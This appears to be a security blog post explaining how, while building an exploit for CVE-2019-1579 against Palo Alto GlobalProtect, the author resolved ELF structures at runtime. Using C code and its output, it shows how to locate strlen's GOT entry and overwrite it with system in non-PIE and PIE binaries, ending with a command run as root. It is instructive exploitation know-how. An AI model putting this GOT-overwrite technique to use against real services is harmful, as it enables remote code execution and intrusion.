---
layout: post
title:  "Some notes on searching for functions at runtime"
date:   2020-09-12 15:00:00 +0000
---
I wanted to share some interesting knowledge that I gained while building an exploit for CVE-2019-1579. This writeup will mostly focus on how to resolve functions during runtime, which was needed to find the addresses of `strlen_GOT` and `system_plt` for the POC in the [original writeup](https://blog.orange.tw/2019/07/attacking-ssl-vpn-part-1-preauth-rce-on-palo-alto.html). Much of my CVE-2019-1579 exploit is based on [a post by Securifera](https://www.securifera.com/blog/2019/09/10/preauth-rce-on-palo-alto-globalprotect-part-ii-cve-2019-1579), which also covers some of the information in this post. 

This information can be useful when you have arbitrary read/write primitives, but no other direct access to the full target binary, and dumping the full binary to find offsets/addresses of useful functions would not be practical.

### Overview
Say you are attacking a blackbox service and you come across arbitrary read/write primitives. You know that the binary does not use full RELRO, so you decide to overwrite the GOT entry for `strlen` with the address of `system`. Unfortunately, you don't have access to the full binary to dump addresses/offsets, and the read primitive is slow enough that it would be impractical to dump the entire ELF and use existing tools to parse/RE it. 

This example will use a simple program which has the goal of overwriting its own `strlen` with `system`. To start, we will be using a non-PIE binary, just like on the vulnerable Palo Alto service, although I will also cover the changes that are needed to make this work with PIE at the end of the post. 
 
So, our goal is to replace `strlen` with `system`. Working backwards from there, our first step will be overwriting the entry for `strlen` in the [global offset table](https://refspecs.linuxfoundation.org/ELF/zSeries/lzsabi0_zSeries/x2251.html) with the address of `system`. 

In order to find the GOT entry for a function defined in an external library, we need to look at the [PLT relocations](https://refspecs.linuxfoundation.org/elf/gabi4+/ch4.reloc.html) and find the relocation associated with the correct symbol. Each GOT entry holds the address of the function, so our goal will be to read pointer to `system` and overwrite the GOT entry for `strlen` with it.

Finding the correct symbol requires searching through the [symbol table](https://refspecs.linuxfoundation.org/elf/gabi4+/ch4.symtab.html) to find the entry with the correct name. The symbol table entry stores the name as an index into the [string table](https://refspecs.linuxfoundation.org/elf/gabi4+/ch4.strtab.html), so we need that too.

Addresses and sizes for the string table, symbol table, and relocation tables can all be found in the [dynamic section](https://refspecs.linuxfoundation.org/elf/gabi4+/ch5.dynamic.html#dynamic_section).

The location and size of the dynamic section are stored in a [program header](https://refspecs.linuxfoundation.org/elf/gabi4+/ch5.pheader.html). 

The address of the program headers and the number of program headers is stored in the [ELF header](https://refspecs.linxfoundation.org/elf/gabi4+/ch4.eheader.html). For a non-PIE executable on an x86\_64 system, this will be at 0x400000. 

So, our path forward to finding the values we need will look something like this:
![](/assets/img0.png)

### Parse all the things
All of the structures and constants needed to parse an elf file live in ``elf.h``. 

To start, we need to read the ELF header, which is an `Elf64_Ehdr`.

{% highlight c %}
char *elf_base_addr=(char*)0x400000;
Elf64_Ehdr ehdr=*(Elf64_Ehdr*)(elf_base_addr);
{% endhighlight%}

The program headers start at the offset in the `e_phoff` field, and there are `e_phnum` program headers. We iterate through them, searching for the program header with the `p_type` set to `PT_DYNAMIC`.

{% highlight c %}
Elf64_Phdr* phdr= (Elf64_Phdr*)(elf_base_addr+ehdr.e_phoff);
Elf64_Phdr pt_dynamic;
for(i=0;i<ehdr.e_phnum;i++){
    if(phdr[i].p_type==PT_DYNAMIC){
        pt_dynamic=phdr[i];
        break;
    }
}
{% endhighlight %}

Once we have the entry for the dynamic section, we need to search for a few entries. Each entry is just a tag/value pair, where the value can be either a pointer or a value type. The tags we are searching for are: 

- DT_STRTAB and DT_STRSZ: string table address and size 
    - Contains the textual names of symbols
- DT_SYMTAB and DT_SYMENT: symbol table address and size 
    - Contains symbol information, including a reference to the string table for looking up by name
- DT_JMPREL and DT_PLTRELSZ: PLT relocations address and size (.rela.plt)
    - Contains the PLT relocations. External ibrary functions should be inside this section. 
- DT_RELAENT: size of a relocation entry
    - We could probably just hardcode the size, but we might as well use this since we are already parsing the section. 


{% highlight c %}
char  *dt_strtab;
int64_t dt_strsz, dt_syment, dt_pltrelsz, dt_relaent;
Elf64_Sym* dt_symtab;
Elf64_Rela* dt_jmprel;

for(i=0; i<pt_dynamic.p_memsz; i+=sizeof(Elf64_Dyn)){
    Elf64_Dyn dynent = *(Elf64_Dyn*) (pt_dynamic.p_vaddr + i);
    switch(dynent.d_tag){
        case DT_STRTAB:
            dt_strtab=(char*)dynent.d_un.d_ptr;
            break;
        case DT_SYMTAB:
            dt_symtab=(Elf64_Sym*)dynent.d_un.d_ptr;
            break;
        case DT_STRSZ:
            dt_strsz=dynent.d_un.d_val;
            break;
        case DT_SYMENT:
            dt_syment=dynent.d_un.d_val;
            break;
        case DT_RELAENT:
            dt_relaent=dynent.d_un.d_val;
            break;
        case DT_PLTRELSZ:
            dt_pltrelsz=dynent.d_un.d_val;
            break;
        case DT_JMPREL:
            dt_jmprel=(Elf64_Rela*)dynent.d_un.d_ptr;
    }
}
{% endhighlight %}

Now we need to look for the function entries in the symbol table. In order to find the correct symbols, we will look at the `st_info` and `st_name` fields. The `st_info` field tells us the type and visibility of the symbol. Since we are looking for functions, we make sure the symbol type is `STT_FUNC`. Since we know the function is defined in an external library, we also know it will be a global symbol. Once we know we are only looking at symbols of the correct type, we can use `st_name` as an index into the string table to find the actual textual name of the symbol. 

{% highlight c %}
int strlen_idx, system_idx;
for(i=0; i<dt_syment; i++){
    if(ELF64_ST_BIND(dt_symtab[i].st_info)==STB_GLOBAL && ELF64_ST_TYPE(dt_symtab[i].st_info)==STT_FUNC){
        if(strcmp("system",dt_strtab+dt_symtab[i].st_name)==0){
            system_idx=i;
        }
        if(strcmp("strlen",dt_strtab+dt_symtab[i].st_name)==0){
            strlen_idx=i;
        }
    }
}
{% endhighlight %}

In order to find the address of the GOT entries, we have to parse the relocation table. Dynamically linked function relocations will be in the PLTREL section, which we found the address and size of earlier. Relocations include the symbol index in their info field, so we just have to iterate through and check the symbol number in the `r_info` field to find the right entries. The `r_offset` field will be the address of the GOT entry for the function.

{% highlight c %}
for(i=0; i<dt_pltrelsz/dt_relaent; i++){
    if(ELF64_R_SYM(dt_jmprel[i].r_info)==strlen_idx){
        strlen_rela=(int64_t*)dt_jmprel[i].r_offset;
    }
    if(ELF64_R_SYM(dt_jmprel[i].r_info)==system_idx){
        system_rela=(int64_t*)dt_jmprel[i].r_offset;
    }
}
{% endhighlight %}

Now that we have the address of strlen and system, we can overwrite strlen with system

{% highlight c %}
*strlen_rela=*system_rela;
{% endhighlight %}

And now we can call strlen with a command and see it get executed! Be careful not to let your compiler optimize the call out. 

{% highlight c %}
char *cmd="id";
strlen(cmd);
{% endhighlight %}

If you want to run it yourself, the full code that I used  is available [here](https://github.com/unfinishedprojects/examplecode/blob/main/finding-functions/test_nopie.c). Here is the output of that code when I run it on my machine.

```
$ ./test_nopie 
e_phoff: 0x40
e_phnum: 0xb
PHDR:
- p_type: 0x2
- p_vaddr: 0x403e20
- p_memsz: 0x1d0

STRTAB: 0x4003e8 (len: 0x59)
SYMTAB: 0x400328 (entries: 0x18)
DT_JMPREL: 0x4004a8 (len: 0x78)
DT_RELAENT: 24
system idx: 3
strlen idx: 2

system@GOT: 0x404028 strlen@GOT 0x404020
before... 0x404020: 0x401046
after... 0x404020: 0x401056

calling strlen...

uid=0(root) gid=0(root) groups=0(root)
done
```




### PIE
Translating this to a PIE binary requires only a few modifications.

First, we need to search for the base address given a pointer into the ELF. Since we know an elf must be aligned to 4096-byte boundaries, we can easily search for the ELF magic value at each boundary before our pointer. In this code, I use the address of getBaseAddr as my initial function pointer.

{% highlight c %}
char* getBaseAddr(){
    int32_t* addr=(int32_t*)((int64_t)getBaseAddr&0xfffffffffffff000);
    while(*addr != 0x464c457f){ // \x7fELF
            printf("%p\n", addr);
            addr-=0x400;
    }
    return (char*)addr;
}
{% endhighlight %}

Now, instead of using the static elf base address, we use the result of that function

{% highlight c %}
<   char *elf_base_addr=(char*)0x400000;
>   char *elf_base_addr=getBaseAddr();
{% endhighlight %}

The address of the dynamic section in the program header will now be stored relative to the base offset.

{% highlight c %}
<   Elf64_Dyn dynent = *(Elf64_Dyn*) (pt_dynamic.p_vaddr + i);
>   Elf64_Dyn dynent = *(Elf64_Dyn*) (elf_base_addr+pt_dynamic.p_vaddr + i);
{% endhighlight %}

Relocations will now contain an offset relative to the base address as well.

{% highlight c %}
<   strlen_rela=(int64_t*)dt_jmprel[i].r_offset;
>   strlen_rela=(int64_t*)(dt_jmprel[i].r_offset+elf_base_addr);

<   system_rela=(int64_t*)dt_jmprel[i].r_offset;
>   system_rela=(int64_t*)(dt_jmprel[i].r_offset+elf_base_addr);
{% endhighlight %}


and with those simple changes, the program should work just as before.

Like before, the code is [on github](https://github.com/unfinishedprojects/examplecode/blob/main/finding-functions/test_pie.c) if you want to run it yourself.

```
$ ./test_pie 
0x5564161fe000
e_phoff: 0x40
e_phnum: 0xb
PHDR:
- p_type: 0x2
- p_vaddr: 0x3df8
- p_memsz: 0x1e0

STRTAB: 0x5564161fd438 (len: 0x9e)
SYMTAB: 0x5564161fd330 (entries: 0x18)
DT_JMPREL: 0x5564161fd5d0 (len: 0x78)
DT_RELAENT: 24
system idx: 4
strlen idx: 3

system@GOT: 0x556416201028 strlen@GOT: 0x556416201020
before... 0x556416201020: 0x5564161fe046
after... 0x556416201020: 0x5564161fe056

calling strlen...

uid=0(root) gid=0(root) groups=0(root)
done
```


### Conclusion
ELF files are a mess of structures and pointers, but ultimately it's not that hard to find what you're looking for. 
